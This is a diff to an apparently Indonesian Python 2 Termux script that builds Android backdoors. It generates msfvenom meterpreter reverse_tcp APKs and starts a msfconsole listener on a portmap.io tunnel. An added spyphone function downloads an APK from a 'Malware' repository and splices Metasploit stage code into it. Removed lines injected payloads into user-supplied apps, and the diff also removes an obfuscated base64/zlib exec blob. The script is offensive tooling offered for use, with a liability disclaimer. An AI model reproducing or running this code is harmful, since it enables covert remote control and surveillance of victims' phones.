@@ -2,11 +2,13 @@
 # open resources Sampai Update Versi Stable
 
 
-import os;
-import time;
+import os
+import time
+import itertools
+import threading
 import sys
-import subprocess
-from bs4 import BeautifulSoup as Soup
+
+
 
 putih="\x1b[1;97m"
 merah="\x1b[1;91m"
@@ -19,11 +21,11 @@ bold= '\033[1m'
 end= '\033[0m'
 
 
-
+def out():
+	os.system("exit")
 
 os.system("clear")
-print putih
-confirm =raw_input('Sudah mempunyai akun Portmap.io? y/n : ')
+confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
 if confirm== 'y':
   os.system('clear')  
 else :
@@ -33,45 +35,117 @@ else :
     print '' 
     os.system('termux-open https://portmap.io')
     time.sleep(1)
-    exit()
+    out()
   else :
     if confirm== ' ':
       os.system('python2 msfgaf.py')
     else :
-      print ('konfirmasi Ditolak!')
-      time.sleep(1)
       os.system('python2 msfgaf.py')
       
+confirm=raw_input('sudah Aktifkan OpenVPN?  y/n : ')
+if confirm== '' :
+	os.system('python2 msfgaf.py')
+else :
+	if confirm== 'y' :
+		print ' '
+	else :
+		if confirm== 'n' :
+			os.system('clear')
+			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
+			time.sleep(2)
+			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
+			home()
+		else :
+			print 'Konfirmasi Salah!'
+			time.sleep(4)
+			os.system('clear')
+			out()
+      
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJzNU1tLAkEUHm+lRkFPQr0c6MUXEwuKLkRrhJZk4uXBehrddVzci+zMFhK99QMKkiDoz/lLOjOuohZBT3Vm5uw5Z77vm2F3T5sEFsJ1iouvotMJeSLkBoMQqaXDWGlPcDI5k7hrorYLRT2MTmASISkRIik9SlLjQiwoLE0Ky0EhrgphglQM9IRUIXhSEjXLPI9nJGHzNnd0sGNDEO3bo+HraPj8z+bbzPVexmHOhkWrnFcvygWtrpVlplB7dsBbxKLOrOaMZInaJtRNnfYgb3iCOoz5DoNLek9boAnKoWYwalF1BEw0fhCUNzMsqUM96kCxUWpcQRNz0BydgkV7fg/r83LqhuhnNN//+it8nR9Jvos/U+b3xleQB5ovuq4HcAh8A/MC7VAPqibvDeChMqhq9Qy/Y4/4Gsbwgim6fkvBtzDvCtE/zGaZqm63XTs75WRt3mG0E/Cari/8liF5sHDMdyZkB6Yj6ERUNuWAOiKGAfMMYxz1fWF20wo2dVz2rM4UxXKZK1udr6mmj+FYVyMRKqflRjU6x50TiOPj2HZ13zJOFFZufgKdeW2g"))))     
 
 
+def payload():
+	os.system("clear")
+	logo()
+	print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
+	print "Contoh Menggunakan Config Saya"
+	print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967"
+	print "                                     \x1b[1;91m^"
+	print "----------------------------------------------"
+	lp=raw_input("Port : ")
+	if lp== ' ' :
+		print 'Harus Diisi'
+		payload()
+	else :
+		print ' '
+	print "\x1b[1;97mMasukan LHOST"
+	print "Contoh Menggunakan Config Saya"
+	print "\x1b[1;91mgafar97port-53967.portmap.io"
+	print "\x1b[1;91m                 ^"
+	print "----------------------------------------------"
+	lh=raw_input("lhost : ")
+	if lh== ' ' :
+		print 'Harus Diisi'
+	else :
+		print ' '
+	print 'PLEASE WAIT ...'
+	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
+
+	
+def spyphone():
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk -o Malware/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("cd Malware && rm -rf payload.apk payload spyphone")
+	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
+	os.system("rm -rf Malware/spyphone.apk")
+	payload()
+	os.system("cd Malware && apktool d payload.apk -o payload && cd ")
+	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit")
+	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
+	os.system("cd Malware && rm -rf payload.apk payload spyphone")
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+	home()
+		
+	
+def awal():
+	malware()
+	pilmal()	
+	
+def malware():
+    os.system('clear')
+    logo()
+    os.system('figlet Malware |lolcat')
+    print '\x1b[1;91m1.\x1b[1;97mSpyphone'
+    print '\r\x1b[1;91m__________________________________________«Back» '
+    
+def pilmal():
+    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
+    if zedd == '':
+        time.sleep(1)
+        home()       
+    else:
+        if zedd == '1':
+            spyphone()
+        else:
+			print '\x1b[1;91m[!] Pilihan Salah'
+			os.system('clear')
+			rumah()
+
+      
+
+def logo():      
+	print "\n \x1b[1;92m \n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;91m                 PERINGATAN    \x1b[1;96m\x1b[1;97m                ║\n \x1b[1;97m║\x1b[1;91m    Kami Tidak Bertanggung Jawab Atas Segala   \x1b[  \x1b[1;97m ║\n \x1b[1;97m║\x1b[1;91m       Pelanggaran HUKUM Yang Anda lakukan   \x1b[  \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n'
+	print '---------------------------------------------------'
+	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
+	print cyan+' Github  : '+green+'http://github.com/PyRAT-svg/msfgaf '
+	print cyan+' Youtube : '+green+'Gafar Risky                     '
+	print putih+'---------------------------------------------------'
+	print ''
 
 
 def remote():
-    os.system("clear")
-    print putih
-    confirm=raw_input('sudah Aktifkan OpenVPN?  y/N : ')
-    if confirm== '' :
-    	print 'Harus Diisi'
-        remote()
-    else :
-    	if confirm== 'y' :
-    	    print ' '           
-    	else :
-    	    if confirm== 'n' :
-    	        os.system('clear')
-            	print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
-                time.sleep(2)
-    	        os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
-                remote()
-                
-            else :
-            	print 'Konfirmasi Salah!'
-                os.system('clear')
-                remote()
-    	
+    os.system("clear")    	
     logo()
     print (''+putih)
     os.system('ifconfig')
@@ -110,98 +184,42 @@ def remote():
     else :
       os.system("clear")
       os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;'");
+      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       home() 
 
 
     
 def sisip():
-    os.system("clear")
-    logo()
-    name=raw_input('Nama Infeksi : ')
-    if name == '' :
-    	sisip() 
-    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
-    print "Contoh Menggunakan Config Saya"
-    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
-    print "                                     \x1b[1;91m^"
-    print "----------------------------------------------"
-    port=raw_input("Port : ")
-    if port== ' ' :
-    	print 'Harus Diisi'
-        sisip()
-    else :
-    	print ' '
-    print "\x1b[1;97mMasukan LHOST"
-    print "Contoh Menggunakan Config Saya"
-    print "\x1b[1;91mgafar97port-53967.portmap.io" 
-    print "\x1b[1;91m                 ^"
-    print "----------------------------------------------"
-    lh=raw_input("lhost : ")
-    if lh== ' ' :
-    	print 'Harus Diisi'
-    else :
-    	print ' '
-    os.system('clear')
-    logo()
-    print (merah+'«__________________✧_List File_✧__________________»')
-    print (''+putih)
-    os.system('ls')
-    print ('')
-    print (merah+'___________________«»')
-    
-    
-    bhn=raw_input(merah+"╚═\x1b[1;91m▶"+merah+"Input Bahan :"+putih+' ');
-    os.system('clear')
-    
-    print hijau+"[*] GENERATE BACKDOOR \n";
-    os.system('apktool if '+str(bhn))    
-    os.system('msfvenom -x '+str(bhn)+' -p android/meterpreter/reverse_tcp lhost='+str(lh)+' lport='+str(port)+' -o '+str(name)+'.apk');
-    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
-    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity') 
+    awal() 
     time.sleep(3)
-    home()
-
-	
-    
-    
-    
-
-    
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    home() 
     
     
 def update():
 	os.system('clear')
-	os.system('git stash && git pull && git stash apply')
-	os.system('git pull origin master')
+	os.system('git stash && git pull origin master')
 	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	home()
     
 	
-
-
-    
-   
-   
     
 def baru():
     os.system('clear')
     logo()
-    name=raw_input("Name : ")
-    
+    name=raw_input("Name : ")  
     print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
     print "Contoh Menggunakan Config Saya"
     print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
     print "                                     \x1b[1;91m^"
     print "----------------------------------------------"
-    port=raw_input("Port : ")
-    
+    port=raw_input("Port : ") 
     print "\x1b[1;97mMasukan LHOST"
     print "Contoh Menggunakan Config Saya"
     print "\x1b[1;91mgafar97port-53967.portmap.io" 
     print "\x1b[1;91m                 ^"
     print "----------------------------------------------"
     lh=raw_input("lhost : ")
-    
     os.system('clear')
     print hijau+"[*] GENERATE BACKDOOR \n"
     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
@@ -216,7 +234,7 @@ def menu():
     os.system('clear')
     time.sleep(1)
     logo()
-    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor \x1b[1;91m{'+orange+'beta'+merah+'}'
+    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
     print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
     print '\x1b[1;91m3.\x1b[1;97mEsekusi'
     print '\x1b[1;91m4.\x1b[1;97mUpdate--'
@@ -258,10 +276,7 @@ def pilih():
 def home():
 	menu()
 	pilih()         
-            
-        
-            
-        
+                   
         
 
 pilih();
